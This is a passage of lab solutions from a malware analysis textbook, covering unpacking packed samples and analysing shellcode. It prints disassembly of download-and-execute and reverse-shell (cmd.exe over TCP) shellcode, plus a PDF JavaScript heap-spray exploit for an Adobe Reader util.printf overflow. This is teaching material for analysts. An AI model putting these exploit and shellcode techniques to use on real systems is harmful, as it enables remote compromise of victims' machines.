[Word Count: 42]

0040116D         mov     edx, [ebp+arg_4]
00401170         push    edx
00401171         lea     eax, [ebp+pe.szExeFile]
00401177         push    eax
00401178         call    sub_401060   ; make lowercase
0040117D         add     esp, 4
00401180         push    eax
00401181         call    sub_401000   ; get string hash
00401186         add     esp, 8
00401189         mov     [ebp+var_130], eax
0040118F         mov     ecx, [ebp+var_130]
00401195         cmp     ecx, [ebp+arg_0] 
[Word Count: 53]

Listing 17-17L: Code for comparing a process name string
[Word Count: 9]

The function sub_401060 called at  takes a single parameter containing 
the name of the process and sets all of the parameter’s characters to lower-
case. The function sub_401000 called at  takes two parameters: 6 (arg_4) and 
the lowercase string returned from sub_401060. The result of this function is
[Word Count: 50]

This malware performs four different checks for VMware. Three of these 
check for system residue, and the other queries the I/O communication 
port. The system residue checking techniques include the following:
[Word Count: 31]


Check the first 3 bytes of the MAC address for known values associated 
with virtual machines.
[Word Count: 17]


Check the registry for the key vmware under the registry path SYSTEM\
CurrentControlSet\Control\DeviceClasses.
[Word Count: 14]


Check the process listing for processes beginning with the string vmware 
in any combination of uppercase and lowercase letters.
[Word Count: 20]

00409F32   CALL EBP
00409F34   POP EAX
00409F35   POPAD
00409F36   LEA EAX,DWORD PTR SS:[ESP-80]
00409F3A   PUSH 0
00409F3C   CMP ESP,EAX
00409F3E   JNZ SHORT Lab14-1.00409F3A
00409F40   SUB ESP,-80
00409F43  JMP Lab14-1.0040154F
00409F48    DB 00
[Word Count: 32]

00409F49    DB 00
00409F4A    DB 00
00409F4B    DB 00
00409F4C    DB 00
00409F4D    DB 00
00409F4E    DB 00
[Word Count: 18]

Listing 18-1L: Tail jump for the modified UPX packer
[Word Count: 9]

00401090     DB 55                                    ;  CHAR 'U'
00401091     DB 8B
00401092     DB EC
00401093     DB 6A                                    ;  CHAR 'j'
00401094     DB FF
00401095     DB 68                                    ;  CHAR 'h'
[Word Count: 27]

Listing 18-2L: Code at the OEP that has not been analyzed by OllyDbg
[Word Count: 13]

Depending on your version, OllyDbg may not have disassembled this 
code because it did not realize that it is code. This is somewhat common and 
unpredictable when dealing with packed programs, and it can be a sign that 
the code is part of the original code, rather than part of the unpacking stub.
[Word Count: 53]

To force OllyDbg to disassemble the code, right-click the first byte and select 
AnalysisAnalyze Code. This displays the code for the beginning of the pro-
gram, as shown in Listing 18-3L.
[Word Count: 31]

00401090  PUSH EBP                ;  msvcrt.77C10000
00401091  MOV EBP,ESP
00401093  PUSH -1
00401095  PUSH Lab07-02.00402078
0040109A  PUSH Lab07-02.004011D0
[Word Count: 17]

Listing 18-3L: Code at the OEP after it has been analyzed by OllyDbg
[Word Count: 13]

0040A110   ENTER 0,0
0040A114   PUSH EBP
0040A115 MOV ESI,DWORD PTR SS:[EBP+8]
0040A118   MOV EDI,DWORD PTR SS:[EBP+C]
0040A11B   CLD
0040A11C   MOV DL,80
0040A11E   MOV AL,BYTE PTR DS:[ESI]
0040A120   INC ESI
0040A121   MOV BYTE PTR DS:[EDI],AL
[Word Count: 34]

Listing 18-4L: OllyDump’s guess at the OEP after using the Find OEP by Section Hop (Trace 
Into) option
[Word Count: 18]

Next, we try the Find OEP by Section Hop (Trace Over) option and we 
see that the code stops on a ret instruction at the end of a function in ntdll, 
which is clearly not the OEP. 
Since the OllyDump plug-in didn’t work, we examine the code to see if 
the tail jump is easy to spot. As shown in Listing 18-5L, we eventually come to 
some code that looks like a tail jump. This code is a retn instruction followed 
by a bunch of zero bytes. We know that the code can’t go past this point.
[Word Count: 97]

00405622   SCAS DWORD PTR ES:[EDI]
00405623   ADD BH,CH
00405625   STC
00405626 RETN 0EC3F
00405629   ADD BYTE PTR DS:[EAX],AL
0040562B   ADD BYTE PTR DS:[EAX],AL
0040562D   ADD BYTE PTR DS:[EAX],AL
[Word Count: 28]

00405130 JMP SHORT Lab09-02.00405138
00405132   PUSH 1577
00405137   RETN
00405138 PUSHFD
00405139 PUSHAD
0040513A CALL Lab09-02.00405141
0040513F   XOR EAX,EAX
[Word Count: 19]

Listing 18-6L: Start of the unpacking stub
[Word Count: 7]

The first instruction at  is an unconditional jump that skips the next 
two instructions. The first two instructions that affect memory are pushfd at  
and pushad at . These instructions save all of the registers and flags. It’s 
likely that the packing program will restore all the registers and flags immedi-
ately before it jumps to the OEP, so we can try to find the OEP by setting an
[Word Count: 71]

access breakpoint on the stack. Presumably, there will be a popad or popfd 
instruction right before the tail jump, which will lead us to the OEP.
We restart the program and step-over the first three instructions. The 
program should be stopped at the call instruction at  in Listing 18-6L. Now 
we need to find the value of the stack pointer to set a breakpoint. To do so, we 
examine the registers window, as shown on the top right of Figure 18-1L.
[Word Count: 82]

Figure 18-1L: Setting a hardware breakpoint on the stack to help find OEP
[Word Count: 13]

0040754F   POPFD
00407550   PUSH EAX
00407551   PUSH Lab18-03.00401577
00407556   RETN 4
[Word Count: 11]

Listing 18-7L: Instructions where our stack breakpoint is triggered showing the tail jump
[Word Count: 13]

A few instructions into our code, we see a retn instruction that transfers 
execution to another location. This is probably the tail jump. We step to that 
instruction to determine where it goes and see the code in Listing 18-8L. This 
looks like the original code; the call to GetVersion at  is a dead giveaway.
[Word Count: 56]

NOTE
As in Lab18-02.exe, you may need to force OllyDbg to disassemble this code using the 
AnalysisAnalyze Code command.
[Word Count: 19]

00401577 PUSH EBP
00401578   MOV EBP,ESP
0040157A   PUSH -1
0040157C   PUSH Lab18-03.004040C0
00401581   PUSH Lab18-03.0040203C         ;  SE handler installation
00401586   MOV EAX,DWORD PTR FS:[0]
0040158C   PUSH EAX
0040158D   MOV DWORD PTR FS:[0],ESP
00401594   SUB ESP,10
00401597   PUSH EBX
00401598   PUSH ESI
00401599   PUSH EDI
0040159A   MOV DWORD PTR SS:[EBP-18],ESP
0040159D CALL DWORD PTR DS:[404030]     ;  kernel32.GetVersion
[Word Count: 56]

We open the Lab18-04.exe file in PEiD and learn that it is packed with 
ASPack 2.12 -> Alexey Solodovnikov. We then open the malware in OllyDbg 
and see that the first instruction is pushad, which saves the registers onto the 
stack. We know from Chapter 18 that setting a breakpoint on the stack to 
search for the corresponding popad instruction may be a good strategy for this 
packer. We step-over the pushad instruction, as shown in Listing 18-9L at .
[Word Count: 80]

00411001 PUSHAD
00411002   CALL Lab18-04.0041100A
00411007   JMP 459E14F7
[Word Count: 8]

Listing 18-9L: Start of the unpacking stub
[Word Count: 7]

We’re going to use the same technique that we used in the previous lab. 
Once we step-over the pushad instruction, our window looks like Figure 18-2L.
[Word Count: 26]

Figure 18-2L: Setting a breakpoint on the stack for Lab18-04.exe
[Word Count: 10]

We right-click esp at  and select Follow in Dump in order to display the 
memory window, as shown in Figure 18-2L. We then click the top of the stack 
at  and select BreakpointHardware, on AccessDWORD to set a break-
point on the stack instruction.
We press F9 to start the program again. The program eventually hits our 
breakpoint, and we see the code shown in Listing 18-10L.
[Word Count: 69]

004113AF   POPAD
004113B0 JNZ SHORT Lab18-04.004113BA
004113B2   MOV EAX,1
004113B7   RETN 0C
004113BA   PUSH Lab18-04.00403896
004113BF   RETN
[Word Count: 17]

Listing 18-10L: Instructions after our stack breakpoint is triggered
[Word Count: 9]

00403896     DB 55                                    ;  CHAR 'U'
00403897     DB 8B
00403898     DB EC
[Word Count: 12]

00403899     DB 6A                                    ;  CHAR 'j'
0040389A     DB FF
0040389B     DB 68                                    ;  CHAR 'h'
0040389C     DB 88
0040389D     DB B1
0040389E     DB 40                                    ;  CHAR '@'
0040389F     DB 00
[Word Count: 30]

Listing 18-11L: OEP of the code before OllyDbg has analyzed it
[Word Count: 11]

We know this is code, so we tell OllyDbg to disassemble it by right-clicking 
the first byte and selecting AnalysisAnalyze Code. Now we see what looks 
like legitimate code with the telltale GetModuleHandleA function, as shown in 
Listing 18-12L. This confirms our suspicions that this is the OEP.
[Word Count: 48]

00403896  PUSH EBP
00403897  MOV EBP,ESP
00403899  PUSH -1
0040389B  PUSH Lab18-04.0040B188
004038A0  PUSH Lab18-04.004064AC                   ;  SE handler installation
004038A5  MOV EAX,DWORD PTR FS:[0]
004038AB  PUSH EAX
004038AC  MOV DWORD PTR FS:[0],ESP
004038B3  SUB ESP,10
004038B6  PUSH EBX
004038B7  PUSH ESI
004038B8  PUSH EDI
004038B9  MOV DWORD PTR SS:[EBP-18],ESP
004038BC  CALL DWORD PTR DS:[40B0B8]               ;  kernel32.GetVersion
[Word Count: 56]

Listing 18-12L: OEP after OllyDbg has analyzed the code
[Word Count: 9]

Next, we select PluginsOllyDumpDump Debugged Process. We 
click the Get EIP as OEP button, accept the default settings, and click 
Dump. In the dialog, we enter a filename to save a copy of the unpacked 
program.
Having dumped the program, run it to verify that it works properly. 
Then open it in IDA Pro to verify that it is unpacked and has the same 
functionality as Lab09-01.exe.
[Word Count: 67]

We step through the rest of the GetProcAddress until the ret instruction 
brings us back to the unpacking stub, and then we continue to step through 
the code until we see what looks like the tail jump. The next control transfer 
instruction is shown here:
[Word Count: 45]

00408EB4   STOS DWORD PTR ES:[EDI]
00408EB5   JMP SHORT Lab07_01.00408E9E
[Word Count: 9]

This is not the tail jump because it’s relatively short and goes to the fol-
lowing code, which doesn’t look like the start of a program.
[Word Count: 26]

00408E9E   LODS BYTE PTR DS:[ESI]
00408E9F   TEST AL,AL
00408EA1   JNZ SHORT Lab07_01.00408E9E
[Word Count: 12]

These instructions form a short loop, and we step through this code until 
the loop is finished. When the loop is complete, the code falls through to 
these instructions:
[Word Count: 29]

00408EA3   CMP BYTE PTR DS:[ESI],AL
00408EA5   JE SHORT Lab07_01.00408E91
[Word Count: 9]

This is also not the tail jump because it is relatively short and the code at 
the target doesn’t look like the start of a program.
[Word Count: 26]

00408E91   POP ECX
00408E92   INC ESI
00408E93   LODS DWORD PTR DS:[ESI]
00408E94   TEST EAX,EAX
00408E96   JE SHORT Lab07_01.00408EB7
[Word Count: 18]

The jump at this next block of code goes to a retn instruction. A normal 
program would never start with a retn instruction, so we also know that isn’t 
the tail jump.
[Word Count: 32]

When we step-over the retn instruction, we see the code shown in 
Listing 18-13L.
[Word Count: 14]

00401190 PUSH EBP
00401191   MOV EBP,ESP
00401193   PUSH -1
00401195   PUSH Lab07_01.004040D0
0040119A   PUSH Lab07_01.00401C58
0040119F   MOV EAX,DWORD PTR FS:[0]
004011A5   PUSH EAX
004011A6   MOV DWORD PTR FS:[0],ESP
[Word Count: 28]

Listing 18-13L: The OEP for Lab18-05.exe
[Word Count: 6]

This looks like the OEP for several reasons:
[Word Count: 8]

2.
The code starts with a push ebp at , which indicates the beginning of a 
function.
[Word Count: 17]

3.
The code in this function calls GetVersion at  and GetCommandLineA at , 
which are commonly called at the very beginning of a program.
[Word Count: 25]

Having identified the OEP, we use PluginsOllyDumpDump 
Debugged Process to dump the unpacked program. Next, we load the 
program into IDA Pro, but, unfortunately, we get some errors. Apparently, 
the program’s file headers are not fully repaired. However, IDA Pro has 
labeled the main function anyway, so we can analyze the program even 
though the PE file isn’t fully reconstructed.
[Word Count: 60]

The biggest roadblock is that we don’t have any import information. 
However, we can easily spot the calls to imported functions by looking for 
calls to data locations. For example, let’s look at the main method, as shown in 
Listing 18-14L.
[Word Count: 41]

00401000   sub     esp, 10h
00401003   lea     eax, [esp+10h+var_10]
00401007   mov     [esp+10h+var_10], offset aMalservice ; "MalService"
0040100F   push    eax
00401010   mov     [esp+14h+var_C], offset sub_401040
00401018   mov     [esp+14h+var_8], 0
00401020   mov     [esp+14h+var_4], 0
00401028 call    dword_404004
0040102E   push    0
00401030   push    0
00401032   call    sub_401040
00401037   add     esp, 18h
0040103A   retn
[Word Count: 49]

Listing 18-14L: The main method for unpacked Lab18-05.exe
[Word Count: 8]

The call at  jumps out as a call to an imported function. You can click 
the DWORD to view the address of the imported functions for this program, as 
shown in Listing 18-15L.
[Word Count: 34]

00404000 dword_404000    dd 77E371E9h
00404004 dword_404004    dd 77E37EB1h
00404008 dword_404008    dd 77DF697Eh
0040400C                 align 10h
00404010 dword_404010    dd 7C862AC1h 
00404014 dword_404014    dd 7C810BACh
[Word Count: 23]

Listing 18-15L: Imported functions that have not been recognized by IDA Pro
[Word Count: 12]

1.
The shellcode is stored with an alphabetic encoding; each payload byte is 
stored in the low nibble of two encoded bytes.
[Word Count: 22]

2.
The shellcode resolves the following functions:
[Word Count: 7]

http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe
[Word Count: 1]

4.
The shellcode writes %SystemRoot%\System32\1.exe and executes it.
[Word Count: 8]

5.
The shellcode downloads a file from a URL stored within the encoded 
payload, writes it to disk, and executes it.
[Word Count: 21]

You can perform dynamic analysis with the shellcode_launcher.exe utility with 
the following command line:
[Word Count: 14]

shellcode_launcher.exe –i Lab19-01.bin -bp
[Word Count: 4]

00000200   xor     ecx, ecx 
00000202   mov     cx, 18Dh
00000206   jmp     short loc_21F
[Word Count: 13]

00000208
00000208   pop     esi 
00000209   push    esi 
0000020A   mov     edi, esi
0000020C loc_20C:
0000020C   lodsb
0000020D   mov     dl, al
0000020F   sub     dl, 41h ; 'A'
00000212   shl     dl, 4
00000215   lodsb
00000216   sub     al, 41h ; 'A'
00000218   add     al, dl
0000021A   stosb
0000021B   dec     ecx
0000021C   jnz     short loc_20C
0000021E   retn 
0000021F loc_21F:
0000021F   call    sub_208
[Word Count: 59]

Listing 19-1L: Shellcode decoder with alphabetic encoding
[Word Count: 7]

000002BF   pop     ebx
000002C0   call    findKernel32Base
000002C5   mov     edx, eax
000002C7   push    0EC0E4E8Eh      ; kernel32.dll:LoadLibraryA
000002CC   push    edx
000002CD   call    findSymbolByHash
000002D2   mov     [ebp-4], eax
000002D5   push    0B8E579C1h      ; kernel32.dll:GetSystemDirectoryA
000002DA   push    edx
000002DB   call    findSymbolByHash
000002E0   mov     [ebp-8], eax
000002E3   push    78B5B983h       ; kernel32.dll:TerminateProcess
000002E8   push    edx
000002E9   call    findSymbolByHash
000002EE   mov     [ebp-0Ch], eax
000002F1   push    7B8F17E6h       ; kernel32.dll:GetCurrentProcess
000002F6   push    edx
000002F7   call    findSymbolByHash
000002FC   mov     [ebp-10h], eax
[Word Count: 70]

000002FF   push    0E8AFE98h       ; kernel32.dll:WinExec
00000304   push    edx
00000305   call    findSymbolByHash
0000030A   mov     [ebp-14h], eax
0000030D   lea     eax, [ebx]
0000030F   push    eax
00000310   call    dword ptr [ebp-4] ; LoadLibraryA
00000313   push    702F1A36h       ; urlmon.dll:URLDownloadToFileA
00000318   push    eax
00000319   call    findSymbolByHash
[Word Count: 40]

Listing 19-2L: Shellcode resolving imports
[Word Count: 5]

Listing 19-3L shows the main functionality of the shellcode. The malware 
retrieves the system directory at , and then appends the string 1.exe at . 
This is used as the local filesystem path argument to URLDownloadToFileA called 
at . This function is commonly found in shellcode. One function call per-
forms an HTTP GET to the URL the code specifies and stores it at the speci-
fied file path. Here, the URL is the string stored at the end of the decoded 
shellcode. Finally, the shellcode executes the downloaded file at  before 
cleanly exiting.
[Word Count: 95]

1.
The program process-injects the default web browser, Internet Explorer.
[Word Count: 10]

2.
The shellcode buffer is located at 0x407030.
[Word Count: 8]

3.
The shellcode is XOR’ed with the byte 0xe7.
[Word Count: 9]

4.
The shellcode manually imports the following functions:
[Word Count: 8]

5.
The shellcode connects to IP 192.168.200.2 on TCP port 13330.
[Word Count: 11]

6.
The shellcode provides a remote shell (cmd.exe).
[Word Count: 8]

The malware starts by determining the default web browser by reading the 
registry value HKCR\http\shell\open\command. The browser is created as a new 
process whose StartupInfo.wShowWindow value is set to SW_HIDE, so the process is 
hidden from the user interface. Process-injecting the default web browser is a 
common malware trick because it is normal for the web browser to perform 
network communications.
The following functions are used by the process as part of the injection:
[Word Count: 74]


The function at 0x4010b0 gives the current process proper privileges to 
allow debugging.
[Word Count: 14]


The function at 0x401000 gets the path to the default web browser from 
the register.
[Word Count: 16]


The function at 0x401180 creates a new process, whose window is hidden 
in the GUI.
[Word Count: 16]

The shellcode buffer is located at 0x407030. Because the shellcode is 
capable of bootstrapping itself, dynamic analysis can be easily performed by 
opening the Lab19-02.exe program in OllyDbg and setting the origin to the 
start of the shellcode buffer. Just remember that the shellcode is designed to 
execute within the web browser after it is process-injected, but it can be eas-
ier to perform dynamic analysis in the context of the Lab19-02.exe program.
[Word Count: 73]

This shellcode is encoded with a single-byte XOR scheme. As shown in 
Listing 19-4L, 0x18f bytes are XOR’ed with the value 0xe7 at .
[Word Count: 24]

00407032   pop     edi
00407033   push    small 18Fh
00407037   pop     cx
00407039   mov     al, 0E7h
0040703B loc_40703B:
0040703B   xor     [edi], al 
0040703D   inc     edi
0040703E   loopw   loc_40703B
00407041   jmp     short near ptr unk_407048 
[Word Count: 34]

The shellcode payload begins at 0x407048. Set a breakpoint on the jmp 
instruction at  in Listing 19-4L, and let the code run. The shellcode pay-
load will be decoded and available for analysis. 
The code performs a call/pop at  in Listing 19-5L to obtain the address 
of the function hashes located at 0x4071bb. Remember that all of the code 
listings that follow show disassembly of the decoded bytes, so viewing the pay-
load prior to letting the decode loop run will show different values than 
those in the listings.
[Word Count: 91]

004071B6   call    loc_4070E3 
004071BB   dd 0EC0E4E8Eh           ; kernel32.dll:LoadLibraryA
004071BF   dd 16B3FE72h            ; kernel32.dll:CreateProcessA
004071C3   dd 78B5B983h            ; kernel32.dll:TerminateProcess
004071C7   dd 7B8F17E6h            ; kernel32.dll:GetCurrentProcess
004071CB   dd 3BFCEDCBh            ; ws2_32.dll:WSAStartup
004071CF   dd 0ADF509D9h           ; ws2_32.dll:WSASocketA
004071D3   dd 60AAF9ECh            ; ws2_32.dll:connect
[Word Count: 39]

Next, the shellcode processes the array of symbol hashes, as shown in 
Listing 19-6L. It uses the same findKernel32Base and findSymbolByHash as 
described in Chapter 19 and Lab 19-1. It loads the next DWORD containing a 
symbol hash at , calls findSymbolByHash, and stores the result back to the 
same location at . This turns the array of hash values into a function 
pointer array.
[Word Count: 65]

004070E3   pop     esi
004070E4   mov     ebx, esi
004070E6   mov     edi, esi
004070E8   call    findKernel32Base
004070ED   mov     edx, eax
004070EF   mov     ecx, 4 C02      ; 4 symbols in kernel32
004070F4 loc_4070F4:
004070F4   lodsd 
[Word Count: 33]

004070F5   push    eax
004070F6   push    edx
004070F7   call    findSymbolByHash
004070FC   stosd 
004070FD   loop    loc_4070F4
[Word Count: 15]

The shellcode constructs the string "ws2_32" in Listing 19-7L on the 
stack by pushing two DWORD values at . The current ESP is passed as the 
argument to LoadLibraryA at  to load the ws2_32.dll library. This is a com-
mon trick to form short strings the shellcode needs while it executes. The 
shellcode then proceeds to process the three remaining hash values that 
reside in ws2_32.dll at .
[Word Count: 69]

004070FF   push    3233h           ; "32\x00" 
00407104   push    5F327377h       ; "ws2_"
00407109   push    esp
0040710A   call    dword ptr [ebx]  ; LoadLibraryA 
0040710C   mov     edx, eax
0040710E   mov     ecx, 3           ; 3 symbols in ws2_32 
00407113 loc_407113:
00407113   lodsd
00407114   push    eax
00407115   push    edx
00407116   call    findSymbolByHash
0040711B   stosd
0040711C   loop    loc_407113
[Word Count: 54]

Listing 19-8L shows the socket-creation code. The current ESP is masked 
with EAX at  to ensure that the stack is properly aligned for structures used 
by the Winsock library. The shellcode calls WSAStartup at  to initialize the 
library before any other networking function calls are made. It then calls 
WSASocketA at  to create a TCP socket. It relies on the value in EAX being 0, 
and then increments it to create the correct arguments to WSASocketA. The 
type value is 1 (SOC_STREAM), and the af value is 2 (AF_INET).
[Word Count: 92]

0040711E   sub     esp, 230h
00407124   mov     eax, 0FFFFFFF0h
00407129   and     esp, eax 
0040712B   push    esp
0040712C   push    101h
00407131   call    dword ptr [ebx+10h] ; WSAStartup 
00407134   test    eax, eax
00407136   jnz     short loc_4071AA
00407138   push    eax
00407139   push    eax
0040713A   push    eax
[Word Count: 44]

0040713B   push    eax             ; protocol 0: IPPROTO_IP
0040713C   inc     eax
0040713D   push    eax             ; type 1: SOCK_STREAM
0040713E   inc     eax
0040713F   push    eax             ; af 2: AF_INET
00407140   call    dword ptr [ebx+14h] ; WSASocketA 
00407143   cmp     eax, 0FFFFFFFFh
00407148   jz      short loc_4071AA
[Word Count: 43]

Listing 19-9L shows the shellcode creating a struct sockaddr_in on the 
stack by pushing two DWORD values. The first at  is the value 2C8A8C0h. This is 
the network-byte-order value of the IP address the shellcode will connect to: 
192.168.200.2. The value at  is 12340002h, which is the sin_family (2: AF_INET) 
and sin_port values: 13330 (0x3412) in network-byte order. This sockaddr_in is 
passed to the call to connect at . Storing the IP address and port this way is 
extremely compact and makes static analysis much more difficult when try-
ing to identify network hosts.
[Word Count: 96]

0040714A   mov     esi, eax
0040714C   push    2C8A8C0h     ; Server IP: 192.168.200.2 (c0.a8.c8.02)
0040714C                           ;   in nbo:  0x02c8a8c0
00407151   push    12340002h    ; Server Port: 13330 (0x3412), AF_INET (2)
00407151                           ;   in nbo: 0x12340002
00407156   mov     ecx, esp
00407158   push    10h             ; sizeof sockaddr_in
0040715D   push    ecx             ; sockaddr_in pointer
0040715E   push    eax
0040715F   call    dword ptr [ebx+18h] ; connect 
00407162   test    eax, eax
00407164   jnz     short loc_4071AA
[Word Count: 69]

Listing 19-10L shows the shellcode responsible for creating the cmd.exe 
process. The code stores the command to execute ("cmd\x00") on the stack 
with a simple push at , and then saves the current ESP as a pointer for later 
use. The shellcode then prepares to call CreateProcessA. Most of the argu-
ments are 0 (the contents of ECX), but note that at , bInheritHandles is 1, 
indicating that file handles opened by the shellcode will be available to the 
child process.
[Word Count: 81]

00407166   push    646D63h         ; "cmd\x00" 
0040716B   mov     [ebx+1Ch], esp
0040716E   sub     esp, 54h
00407174   xor     eax, eax
00407176   mov     ecx, 15h
0040717B   lea     edi, [esp]
0040717E   rep stosd
00407180   mov     byte ptr [esp+10h], 44h ; sizeof(STARTUPINFO) 
00407185   inc     byte ptr [esp+3Ch] ; STARTF_USESHOWWINDOW 
[Word Count: 46]

00407189   inc     byte ptr [esp+3Dh] ; STARTF_USESTDHANDLES
0040718D   mov     eax, esi 
0040718F   lea     edi, [esp+48h]  ; &hStdInput 
00407193   stosd                   ; hStdInput := socket
00407194   stosd                   ; hStdOutput := socket
00407195   stosd                   ; hStdError := socket
00407196   lea     eax, [esp+10h]
0040719A   push    esp             ; lpProcessInformation
0040719B   push    eax             ; lpStartupInfo
0040719C   push    ecx
0040719D   push    ecx
0040719E   push    ecx
0040719F   push    1               ; bInheritHandles := True 
004071A1   push    ecx
004071A2   push    ecx
004071A3   push    dword ptr [ebx+1Ch] ; lpCommandLine: "cmd"
004071A6   push    ecx
004071A7   call    dword ptr [ebx+4] ; CreateProcessA
[Word Count: 92]

Once Netcat is running, run Lab19-02.exe on another system. If you have 
set up networking correctly, the victim machine will connect to 192.168.200.2, 
and Netcat will show the Windows command-line banner. You can enter 
commands there as if you were sitting at the victim’s system.
[Word Count: 45]

1.
The PDF contains an example of CVE-2008-2992: buffer overflow related 
to Adobe Reader’s util.printf  JavaScript implementation.
[Word Count: 17]

2.
The shellcode is encoded using JavaScript’s percent-encoding and is 
stored along with the JavaScript in the PDF.
[Word Count: 18]

3.
The shellcode manually imports the following functions:
[Word Count: 8]

4.
The shellcode creates the files %TEMP%\foo.exe and %TEMP%\bar.pdf.
[Word Count: 9]

5.
The shellcode extracts two files stored encoded within the malicious PDF 
and writes them to the user’s %TEMP% directory. It executes the foo.exe 
file and opens the bar.pdf document with the default handler.
[Word Count: 34]

9 0 obj
<<
/Length 3486
>>
stream
var payload = unescape("%ue589%uec81 .... %u9090"); 
var version = app.viewerVersion;
app.alert("Running PDF JavaScript!");
if (version >= 8 && version < 9) { 
    var payload;
    nop = unescape("%u0A0A%u0A0A%u0A0A%u0A0A")
    heapblock = nop + payload;
    bigblock = unescape("%u0A0A%u0A0A");
    headersize = 20;
    spray = headersize+heapblock.length;
    while (bigblock.length<spray) {
        bigblock+=bigblock;
    }
    fillblock = bigblock.substring(0, spray);
    block = bigblock.substring(0, bigblock.length-spray);
[Word Count: 64]

while(block.length+spray < 0x40000) { 
        block = block+block+fillblock;
    }
    mem = new Array();
    for (i=0;i<1400;i++) {
        mem[i] = block + heapblock;
    }
    var num = 12999999999999999999888888888888...;
    util.printf("%45000f",num); 
} else {
    app.alert("Unknown PDF version!");
}
endstream
endobj
[Word Count: 37]

The payload variable is initialized in Listing 19-11L at  using the unescape 
function with a long text string. The unescape function works by translating 
each % character as follows:
[Word Count: 30]


If the % is followed by a u, it takes the next four characters, treats them as 
ASCII hex, and translates this into 2 bytes. The output order will be byte-
swapped due to its endianness.
[Word Count: 37]


If the % is not followed by a u, it takes the next two characters, treats them 
as ASCII hex, and translates this into 1 byte.
[Word Count: 27]

For example, the string begins with %ue589%uec81%u017c and will be trans-
formed into the hex sequence 0x89 0xe5 0x81 0xec 0x7c 0x01. You can use the 
Python script in Listing 19-12L to manually unescape the shellcode payload 
and turn it into a binary file suitable for further analysis, or you can use the 
file Lab19-03_sc.bin, which contains the decoded contents provided with 
the labs.
[Word Count: 64]

def decU16(inbuff):
    """
    Manually perform JavaScript's unescape() function.
    """
    i = 0
    outArr = [ ]
    while i < len(inbuff):
        if inbuff[i] == '"':
            i += 1
        elif inbuff[i] == '%':
            if ((i+6) <= len(inbuff)) and (inbuff[i+1] == 'u'):
                #it's a 2-byte "unicode" value
                currchar = int(inbuff[i+2:i+4], 16)
                nextchar = int(inbuff[i+4:i+6], 16)
                #switch order for little-endian
                outArr.append(chr(nextchar))
                outArr.append(chr(currchar))
                i += 6
            elif (i+3) <= len(inbuff):
                #it's just a single byte
                currchar = int(inbuff[i+1:i+3], 16)
                outArr.append(chr(currchar))
                i += 3
        else:
            # nothing to change
            outArr.append(inbuff[i])
            i += 1
    return ''.join(outArr)
[Word Count: 89]

payload = "%ue589%uec81 ... %u9008%u9090"
[Word Count: 5]

outFile = file('Lab19-03_sc.bin', 'wb')
outFile.write(decU16(payload))
outFile.close()
[Word Count: 6]

Listing 19-12L: Python unescape() equivalent script
[Word Count: 6]

You can dynamically analyze the shellcode using the following command:
[Word Count: 10]

shellcode_launcher.exe –i Lab19-03_sc.bin –r Lab19-03.pdf –bp
[Word Count: 6]

The –r option causes the program to open the specified file for reading 
prior to jumping to the shellcode, and it is required here because this piece 
of shellcode expects that there is an open file handle to the malicious 
media file.
[Word Count: 42]

The beginning of the shellcode in Listing 19-13L uses the call/pop tech-
nique to obtain a pointer to the global data starting at .
[Word Count: 24]

The shellcode in Listing 19-14L uses the same findKernel32Base and 
findSymbolByHash functions defined in Chapter 19 and in Lab 19-1. As in 
Lab 19-2, the shellcode loops over the symbol hashes, resolves them, and 
stores them back to create a function pointer array. This is done 14 times 
for kernel32 at . The shellcode then creates the string shell32 on the stack 
by pushing two DWORD values at  to use as an argument to LoadLibraryA. 
A single export from shell32.dll is resolved and added to the function 
pointer array at .
[Word Count: 92]

0000017B   pop     esi
0000017C   mov     [ebp-14h], esi
0000017F   mov     edi, esi
00000181   mov     ebx, esi
00000183   call    findKernel32Base
00000188   mov     [ebp-4], eax
0000018B   mov     ecx, 0Eh 
00000190 loc_190:
00000190   lodsd
00000191   push    eax
00000192   push    dword ptr [ebp-4]
00000195   call    findSymbolByHash
0000019A   stosd
0000019B   loop    loc_190
0000019D   push    32336Ch         ; l32\x00 
[Word Count: 53]

000001A2   push    6C656873h       ; shel
000001A7   mov     eax, esp
000001A9   push    eax
000001AA   call    dword ptr [ebx] ; LoadLibraryA
000001AC   xchg    eax, ecx
000001AD   lodsd
000001AE   push    eax
000001AF   push    ecx
000001B0   call    findSymbolByHash
000001B5   stosd 
[Word Count: 37]

000001B6   xor     esi, esi 
000001B8   mov     ebx, [ebp-14h]
000001BB loc_1BB:
000001BB   add     esi, 4 
000001C1   lea     eax, [ebp-8]
000001C4   push    eax
000001C5   push    esi
000001C6   call    dword ptr [ebx+1Ch] ; GetFileSize
000001C9   cmp     eax, [ebx+3Ch]      ; PDF file size
000001CC   jnz     short loc_1BB
000001CE   mov     [ebp-8], esi
[Word Count: 49]

000001D1   xor     edx, edx
000001D3   push    dword ptr [ebx+44h] 
[Word Count: 10]

000001D6   push    edx
000001D7   call    [ebx+sc0.GlobalAlloc]
000001DA   test    eax, eax
000001DC   jz      loc_313
000001E2   mov     [ebp-0Ch], eax
000001E5   xor     edx, edx
000001E7   push    edx
000001E8   push    edx
000001E9   push    dword ptr [ebx+40h] ; File 1 offset E08
000001EC   push    dword ptr [ebp-8]   ; PDF File Handle
000001EF   call    dword ptr [ebx+20h] ; SetFilePointer
000001F2   push    dword ptr [ebx+44h] ; File 1 Size 
000001F5   push    dword ptr [ebp-0Ch] ; memory buffer
000001F8   push    dword ptr [ebp-8]   ; PDF File Handle
000001FB   push    dword ptr [ebx+24h] ; ReadFile
000001FE   call    fileIoWrapper 
[Word Count: 90]

Listing 19-16L: Reading the first embedded file
[Word Count: 7]

The code calls SetFilePointer to adjust the location in the malicious PDF 
so that it will be based on the value stored at 0x40 in the embedded data, the 
file offset for the first file to be extracted from the malicious PDF. The shell-
code calls a helper function that we’ve named fileIoWrapper at  to read the 
file contents. Analysis of the function shows that it has the following function 
prototype:
[Word Count: 72]

__stdcall DWORD fileIoWrapper(void* ioFuncPtr, DWORD hFile, char* buffPtr,DWORD bytesToXfer);
[Word Count: 9]

The first argument to fileIoWrapper is a function pointer to either ReadFile 
or WriteFile. The shellcode calls the given function pointer in a loop, trans-
ferring the entire buffer to or from the given file handle.
Next, the shellcode in Listing 19-17L constructs an output file path, calls 
GetTempPathA at , and then appends the string foo.exe.
[Word Count: 57]

00000203   xor     eax, eax
00000205   lea     edi, [ebp-124h] ; file path buffer
0000020B   mov     ecx, 40h 
00000210   rep stosd
00000212   lea     edi, [ebp-124h] ; file path buffer
00000218   push    edi
00000219   push    100h
0000021E   call    dword ptr [ebx+10h] ; GetTempPathA 
